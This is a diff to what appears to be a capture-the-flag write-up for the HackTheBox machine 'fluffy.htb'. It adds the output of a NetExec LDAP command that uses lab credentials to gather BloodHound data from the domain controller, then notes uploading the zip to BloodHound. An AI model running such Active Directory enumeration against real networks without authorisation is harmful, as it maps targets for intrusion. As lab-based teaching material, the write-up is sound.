@@ -365,3 +365,16 @@ nxc ldap fluffy.htb -u p.agila -p prometheusx-303 --bloodhound --collection All 
 	-p : password
 	 --bloodhound : for the ingester json type
 	 --collection : all for collecting all info
+	 
+ The Output
+```bash
+ LDAP        10.10.11.69     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:None) (channel binding:Never) 
+LDAP        10.10.11.69     389    DC01             [+] fluffy.htb\p.agila:prometheusx-303 
+LDAP        10.10.11.69     389    DC01             Resolved collection methods: localadmin, container, trusts, acl, dcom, session, group, psremote, objectprops, rdp
+[22:26:15] ERROR    Unhandled exception in computer DC01.fluffy.htb processing: The NETBIOS connection with the remote host timed out.                                        computers.py:268
+LDAP        10.10.11.69     389    DC01             Done in 0M 19S
+LDAP        10.10.11.69     389    DC01             Compressing output into /home/dork/.nxc/logs/DC01_10.10.11.69_2025-06-30_222556_bloodhound.zip
+
+```
+You can copy the bloodhound.zip file to your desired location and then upload it to bloodhound.
+
